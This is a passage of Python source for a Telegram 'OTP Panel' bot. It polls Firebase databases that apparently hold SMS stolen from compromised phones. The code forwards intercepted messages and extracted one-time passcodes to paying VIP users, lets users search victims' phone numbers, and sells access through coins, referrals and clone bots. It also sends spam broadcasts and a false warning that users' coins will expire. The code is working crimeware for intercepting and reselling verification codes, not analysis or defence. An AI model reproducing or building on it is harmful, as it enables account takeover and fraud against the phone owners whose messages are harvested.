        ref_text = f"💸 REFER & EARN\n━━━━━━━━━━━━━━━━━━\nInvite friends and earn <b>10 Coins per referral!</b>\n24 Hours VIP = {cost} Coins.\n\nYour Referral Link:\n<code>{ref_link}</code>\n\nCurrent Referrals: {all_users.get(chat_id, {}).get('referrals', 0)}"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Share Link ↗️", url=f"https://t.me/share/url?url={ref_link}&text=Try this premium OTP Panel Bot!")],
            [InlineKeyboardButton("👀 View My Referrals", callback_data="view_referrals")]
        ])
        await update.message.reply_text(ref_text, disable_web_page_preview=True, reply_markup=kb, parse_mode="HTML")
        return

    if text == "👤 My Profile":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        prof_text = get_profile_text(chat_id, users_db, is_main_bot)
        reply_markup = get_profile_keyboard(chat_id, users_db)
        await update.message.reply_text(prof_text, reply_markup=reply_markup, parse_mode="HTML")
        return

    if text == "💬 Support Group":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text(f"Click the link below to join our support group:\n{OPTIONAL_GROUP['url']}", disable_web_page_preview=True)
        return

    if text == "🛡 Admin Panel" and is_admin:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text(admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token), parse_mode="HTML")
        return

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            await update.message.reply_text("✅ Action cancelled.", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
        else:
            await update.message.reply_text("ℹ️ No pending action to cancel.")
        return

    state = pending_action.get(chat_id)
    if not state: return

    action = state.get("action")
    
    if action == "add_private_panel" and is_main_bot:
        pending_action.pop(chat_id)
        url = text.strip().rstrip("/")
        if "firebaseio.com" in url:
            all_users.setdefault(chat_id, {}).setdefault("private_panels", []).append(url)
            save_user(chat_id)
            await update.message.reply_text("✅ Private Panel Added Successfully!\nYe sirf aapko 'Devices List' mein dikhega.")
        else:
            await update.message.reply_text("❌ Invalid Firebase URL.")
        return
    
    if action == "sa_give_coins" and is_admin:
        pending_action.pop(chat_id)
        try:
            target_uid, amount = map(int, text.split())
            if target_uid in users_db:
                users_db[target_uid]["coins"] = users_db[target_uid].get("coins", 0) + amount
                await update.message.reply_text(f"✅ User {target_uid} ko {amount} coins de diye gaye.")
                try:
                    app_to_use = _main_app if is_main_bot else CLONES[bot_token]["app"]
                    await app_to_use.bot.send_message(target_uid, f"🎁 Admin ne aapko <b>{amount} coins</b> bheje hain!", parse_mode="HTML")
                except: pass
            else:
                await update.message.reply_text("❌ User ID not found.")
        except:
            await update.message.reply_text("❌ Invalid format. Use: UID AMOUNT")
        return
        
    if action == "sa_give_coins_all" and is_admin:
        pending_action.pop(chat_id)
        try:
            amount = int(text.strip())
            count = 0
            app_to_use = _main_app if is_main_bot else CLONES[bot_token]["app"]
            
            for target_uid in users_db:
                users_db[target_uid]["coins"] = users_db[target_uid].get("coins", 0) + amount
                count += 1
                
            await update.message.reply_text(f"✅ SUCCESS! Sabhi {count} users ke account mein {amount} coins add ho gaye hain.")
            
            async def notify_all_users():
                for target_uid in list(users_db.keys()):
                    if target_uid != chat_id:
                        try:
                            await app_to_use.bot.send_message(target_uid, f"🎁 <b>GIFT FROM ADMIN</b> 🎁\n\nAdmin ne sabhi users ko <b>{amount} Coins free</b> diye hain! Aapke account me add ho chuke hain. Enjoy!", parse_mode="HTML")
                        except: pass
                        await asyncio.sleep(0.05)
            
            asyncio.create_task(notify_all_users())
            
        except ValueError:
            await update.message.reply_text("❌ Invalid format. Please enter only a number.")
        return
    
    if action == "create_bot" and is_main_bot:
        new_token = text
        req_coins = state.get("req_coins", 20)
        
        if not re.match(r"^\d+:[A-Za-z0-9_-]+$", new_token):
            await update.message.reply_text("⚠️ Invalid Token Format. Sahi token bhejein ya /cancel likhein.")
            return
            
        pending_action.pop(chat_id)
        
        if all_users.get(chat_id, {}).get("coins", 0) < req_coins and not is_admin:
            await update.message.reply_text(f"❌ Aapke paas {req_coins} coins nahi hain.")
            return
            
        wait_msg = await update.message.reply_text("⏳ Bot process ho raha hai, please wait...")
        
        try:
            if new_token in CLONES:
                if CLONES[new_token]["creator"] != chat_id and not is_admin:
                    await wait_msg.edit_text("❌ Ye bot kisi aur ka hai.")
                    return
                CLONES[new_token]["expiry"] = time.time() + 86400
                CLONES[new_token]["notified"] = False  
                if not is_admin:
                    all_users[chat_id]["coins"] -= req_coins
                    all_users[chat_id]["bot_creation_count"] = all_users[chat_id].get("bot_creation_count", 0) + 1
                await wait_msg.edit_text("✅ Aapka bot successfully RENEW ho gaya agle 24 hours ke liye!")
                if _main_app:
                    for adm in ADMIN_IDS:
                        try: await _main_app.bot.send_message(adm, f"🚨 CLONE BOT RENEWED!\nCreator: {chat_id}\nToken: <code>{new_token}</code>", parse_mode="HTML")
                        except: pass
            else:
                new_app = await start_clone_bot(new_token)
                bot_info = await new_app.bot.get_me()
                if not is_admin:
                    all_users[chat_id]["coins"] -= req_coins
                    all_users[chat_id]["bot_creation_count"] = all_users[chat_id].get("bot_creation_count", 0) + 1
                
                CLONES[new_token] = {
                    "creator": chat_id,
                    "expiry": time.time() + 86400, 
                    "custom_db": None,
                    "app": new_app,
                    "users": {},
                    "username": bot_info.username,
                    "notified": False 
                }
                
                await wait_msg.edit_text(f"✅ Aapka bot successfully ban gaya!\n━━━━━━━━━━━━━━━━━━\nLink: @{bot_info.username}\nExpiry: 24 Hours\n\nAb aap apne bot me jaakar /start karein aur 'Admin Panel' se apna Firebase URL bhi add kar sakte hain.", parse_mode="HTML")
                await update.message.reply_text("Menu updated.", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
                if _main_app:
                    for adm in ADMIN_IDS:
                        try: await _main_app.bot.send_message(adm, f"🚨 NEW CLONE BOT CREATED!\nCreator: {chat_id}\nClone: @{bot_info.username}\nToken: <code>{new_token}</code>", parse_mode="HTML")
                        except: pass
        except Exception as e:
            await wait_msg.edit_text(f"❌ Bot start karne me error aayi. Token check karein. Error: {e}")
        return

    if action == "search_number":
        pending_action.pop(chat_id)
        search_term = re.sub(r"\D", "", text)
        if len(search_term) < 4:
            await update.message.reply_text("⚠️ Enter at least 4 digits to search.")
            return
            
        wait_msg = await update.message.reply_text("⏳ Searching databases...")
        devices = GLOBAL_DEVICE_CACHE.get("ALL", []).copy()
        
        if is_main_bot:
            for i, url in enumerate(users_db.get(chat_id, {}).get("private_panels", [])):
                devices.extend(GLOBAL_DEVICE_CACHE.get(f"U_{chat_id}_{i}", []))
                
        found_devs = [d for d in devices if any(search_term in num for num in d.numbers)]
        
        if not found_devs:
            await wait_msg.edit_text("📭 No matching numbers found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            return
            
        rows = []
        for d in found_devs[:10]:
            tag  = f"[{d.db_tag}] "
            icon = "🟢" if d.status == "online" else "🔴"
            lbl = f"{icon} 📱 {tag}{' & '.join(d.numbers)}"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
            
        rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
        await wait_msg.edit_text(f"🔍 Search Results for: {search_term}\nSelect below:", reply_markup=InlineKeyboardMarkup(rows))
        return

    if action == "broadcast_msg" and is_admin:
        pending_action.pop(chat_id)
        targets = chats_registry.get(bot_token, set())
        wait_msg = await update.message.reply_text(f"⏳ Broadcasting to {len(targets)} users...")
        
        app_to_use = _main_app if is_main_bot else CLONES[bot_token]["app"]
        
        async def send_bc(cid):
            if cid == chat_id: return False
            try:
                await app_to_use.bot.send_message(cid, text, parse_mode="HTML")
                return True
            except:
                return False

        tasks = [send_bc(cid) for cid in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        sent = sum(1 for r in results if r is True)
        failed = len(targets) - sent - (1 if chat_id in targets else 0)
            
        await wait_msg.edit_text(f"📢 BROADCAST COMPLETE\n━━━━━━━━━━━━━━━━━━\n✅ Sent    : {sent}\n❌ Failed  : {failed}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")]]), parse_mode="HTML")
        return

# ═══════════════════════════════════════════════════════
#  FIREBASE POLL — FAST CONCURRENT ENGINE
# ═══════════════════════════════════════════════════════

async def _forward_sms(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return

    label = device_label(device)
    otp   = extract_otp(body)
    msg_text = auto_forward_msg(sms, label)
    
    kb_rows: list[list[InlineKeyboardButton]] = []
    if otp: kb_rows.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
    kb_rows.append([
        InlineKeyboardButton("📩 View All Messages", callback_data=f"msgs:{device.id}"),
        InlineKeyboardButton("ℹ️ Device Info",  callback_data=f"info:{device.id}"),
    ])
    markup = InlineKeyboardMarkup(kb_rows)

    send_tasks = []

    # If it's a private panel, route only to the owner
    if device.db_tag.startswith("U_"):
        uid = int(device.db_tag.split("_")[1])
        if is_vip(TOKEN, uid):
            if otp: all_users.setdefault(uid, {})["otp_count"] = all_users.get(uid, {}).get("otp_count", 0) + 1
            send_tasks.append(_main_app.bot.send_message(uid, msg_text, reply_markup=markup, parse_mode="HTML"))
    else:
        for bot_token, chat_dict in list(user_focus.items()):
            if bot_token != TOKEN:
                if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: continue
                app_to_use = CLONES[bot_token]["app"]
                users_db = CLONES[bot_token]["users"]
            else:
                app_to_use = _main_app
                users_db = all_users

            focused_chats = [cid for cid, did in chat_dict.items() if did == device.id and is_vip(bot_token, cid)]
            spam_chats = [cid for cid, uinfo in users_db.items() if uinfo.get("global_spam") and is_vip(bot_token, cid)]
            
            target_chats = set(focused_chats + spam_chats)
            
            for chat_id in target_chats:
                if otp: users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
                send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
                
                # --- SPAM BROADCAST LOGIC ---
                if spam_broadcast_active and bot_token == TOKEN and chat_id not in ADMIN_IDS:
                    today_str = datetime.now().strftime("%Y-%m-%d")
                    user_spam_data = spam_counters.setdefault(chat_id, {"date": today_str, "count": 0})
                    
                    if user_spam_data["date"] != today_str:
                        user_spam_data["date"] = today_str
                        user_spam_data["count"] = 0
                        
                    if user_spam_data["count"] < 40:
                        try:
                            # Forward incoming SMS to user as spam (simulate)
                            send_tasks.append(app_to_use.bot.send_message(chat_id, f"📥 Promotional Message:\n\n{body}", parse_mode="HTML"))
                            user_spam_data["count"] += 1
                        except: pass
            
    if send_tasks:
        await asyncio.gather(*send_tasks, return_exceptions=True)

async def poll_single_db(tag: str, url: str) -> int:
    try:
        r_main, r_user, r_root = await asyncio.gather(
            fb_get("All_Users/sms", url),
            fb_get("user_sms", url),
            fb_get("sms", url)
        )
        
        forwarded = 0
        devices_in_db = GLOBAL_DEVICE_CACHE.get(tag, [])
        device_map = {d.id: d for d in devices_in_db}
        
        for bulk_data in (r_main, r_user, r_root):
            if not isinstance(bulk_data, dict): continue
            for dev_id, sms_dict in bulk_data.items():
                if not isinstance(sms_dict, dict): continue
                device = device_map.get(dev_id)
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict): continue
                    sk = seen_key(dev_id, k)
                    if sk in seen_ids: continue
                    seen_ids.add(sk)
                    if device:
                        try:
                            await _forward_sms(device, sms)
                            forwarded += 1
                        except: pass
                            
        type4_devs = [d for d in devices_in_db if d.sms_path.endswith("receivedSms")]
        if type4_devs:
            async def fetch_t4_sms(d: Device):
                fwd = 0
                sms_dict = await fb_get(d.sms_path, d.base_url)
                if isinstance(sms_dict, dict):
                    for k, sms in sms_dict.items():
                        if not isinstance(sms, dict): continue
                        sk = seen_key(d.id, k)
                        if sk in seen_ids: continue
                        seen_ids.add(sk)
                        try:
                            await _forward_sms(d, sms)
                            fwd += 1
                        except: pass
                return fwd
            results = await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs))
            forwarded += sum(results)
            
        return forwarded
    except: return 0

async def _update_global_cache():
    dbs_to_poll = dict(DATABASES)
    for c_token, c_data in CLONES.items():
        if time.time() < c_data["expiry"] and c_data.get("custom_db"):
            dbs_to_poll[f"C_{c_token[:6]}"] = c_data["custom_db"]
            
    # Add User Private Panels
    for uid, uinfo in all_users.items():
        if is_vip(TOKEN, uid):
            for i, p_url in enumerate(uinfo.get("private_panels", [])):
                dbs_to_poll[f"U_{uid}_{i}"] = p_url

    all_devices_gathered = []
    for tag, url in dbs_to_poll.items():
        try:
            devs = await fetch_db_data(tag, url)
            GLOBAL_DEVICE_CACHE[tag] = devs
            if not tag.startswith("U_"):
                all_devices_gathered.extend(devs)
        except: pass
        
    unique_devices = {d.id: d for d in all_devices_gathered}
    dev_list = list(unique_devices.values())
    dev_list.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
    GLOBAL_DEVICE_CACHE["ALL"] = dev_list

async def poll_loop(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    while True:
        try:
            await _update_global_cache()
            
            dbs_to_poll = dict(DATABASES)
            for c_token, c_data in CLONES.items():
                if time.time() < c_data["expiry"] and c_data.get("custom_db"):
                    dbs_to_poll[f"C_{c_token[:6]}"] = c_data["custom_db"]
                    
            for uid, uinfo in all_users.items():
                if is_vip(TOKEN, uid):
                    for i, p_url in enumerate(uinfo.get("private_panels", [])):
                        dbs_to_poll[f"U_{uid}_{i}"] = p_url
            
            if first_run:
                for tag, url in dbs_to_poll.items():
                    r_main, r_user, r_root = await asyncio.gather(
                        fb_get("All_Users/sms", url), 
                        fb_get("user_sms", url),
                        fb_get("sms", url)
                    )
                    for bulk in (r_main, r_user, r_root):
                        if not isinstance(bulk, dict): continue
                        for dev_id, sms_dict in bulk.items():
                            if not isinstance(sms_dict, dict): continue
                            for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
                                
                    type4_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.sms_path.endswith("receivedSms")]
                    if type4_devs:
                        async def init_t4(d: Device):
                            sms_dict = await fb_get(d.sms_path, d.base_url)
                            if isinstance(sms_dict, dict):
                                for k in sms_dict: seen_ids.add(seen_key(d.id, k))
                        await asyncio.gather(*(init_t4(d) for d in type4_devs))
                        
                first_run = False
                tlog("✅ Bot Engine ready! Monitoring DBs...")
            else:
                tasks = [poll_single_db(tag, url) for tag, url in dbs_to_poll.items()]
                await asyncio.gather(*tasks)
        except Exception:
            pass
        await asyncio.sleep(POLL_INTERVAL)

# ─── CLONE EXPIRY CHECKER LOOP ─────────────────────────────
async def clone_expiry_checker_loop():
    while True:
        await asyncio.sleep(60) 
        now = time.time()
        for c_token, c_data in list(CLONES.items()):
            if now > c_data.get("expiry", 0) and not c_data.get("notified", False):
                creator = c_data.get("creator")
                uname = c_data.get("username", "Bot")
                if creator and creator in all_users:
                    bots_created = all_users[creator].get("bot_creation_count", 0)
                    req_coins = 50 + (bots_created * 10)
                    req_refers = req_coins // 10
                    msg = (
                        f"⚠️ <b>BOT EXPIRED</b> ⚠️\n\n"
                        f"Aapka clone bot (@{uname}) ka 24 hours ka plan khatam ho gaya hai aur bot ab OFF ho chuka hai.\n\n"
                        f"Ise phir se start (renew) karne ke liye aapko <b>{req_coins} Coins ({req_refers} Refers)</b> lagenge.\n\n"
                        f"Jaldi se refer karein aur main bot mein '🤖 Create Your Bot' option use karke renew karein!"
                    )
                    try:
                        if _main_app:
                            await _main_app.bot.send_message(creator, msg, parse_mode="HTML")
                        CLONES[c_token]["notified"] = True
                    except Exception:
                        pass

# ─── DAILY MARKETING LOOP ─────────────────────────────
async def daily_broadcast_loop():
    await asyncio.sleep(86400) 
    while True:
        try:
            for uid, uinfo in list(all_users.items()):
                if uinfo.get("verified") and not uinfo.get("banned"):
                    user_coins = uinfo.get("coins", 0)
                    msg = (
                        f"🚀 <b>DAILY REWARD & UPDATE</b> 🚀\n\n"
                        f"Aapke account mein abhi <b>{user_coins} Coins</b> hain.\n"
                        f"⚠️ <b>IMPORTANT:</b> Aapke coins agle 48 hours mein EXPIRE ho jayenge agar aapne unhe jaldi use nahi kiya!\n\n"
                        f"Jaldi se apne coins use karein (VIP kharidein ya apna OTP Bot banayein).\n"
                        f"Agar aapke paas coins nahi hain, toh apne doston ko refer karein aur jaldi kamayein.\n\n"
                        f"Niche '💸 Refer & Earn' button dabayein aur aaj hi apna access lein!"
                    )
                    try:
                        if _main_app: await _main_app.bot.send_message(uid, msg, parse_mode="HTML")
                    except: pass
        except Exception as e:
            tlog(f"Daily Broadcast Error: {e}")
        await asyncio.sleep(86400) 

# ═══════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════

def main() -> None:
    if not TOKEN: raise SystemExit("❌ TOKEN is missing!")

    print("═" * 56)
    print("  🤖 OTP PANEL BOT — SUPREME MASTER EDITION")
    print("  🚀 Features: Private Panels, Double Penalty, Clone Engine, Spam Broadcast")
    print("═" * 56)

    app = (
        Application.builder()
        .token(TOKEN)
        .connection_pool_size(1000)
        .pool_timeout(60.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )

    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)

    async def post_init(application: Application) -> None:
        load_data()
        
        for clone_token, c_data in list(CLONES.items()):
            if time.time() < c_data.get("expiry", 0):
                try:
                    tlog(f"Restarting clone bot: @{c_data.get('username')}")
                    clone_app = await start_clone_bot(clone_token)
                    CLONES[clone_token]["app"] = clone_app
                except Exception as e:
                    tlog(f"Failed to restart clone {clone_token}: {e}")

        asyncio.create_task(poll_loop(application))
        asyncio.create_task(clone_expiry_checker_loop())
        asyncio.create_task(auto_save_loop(application))
        asyncio.create_task(daily_broadcast_loop())

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()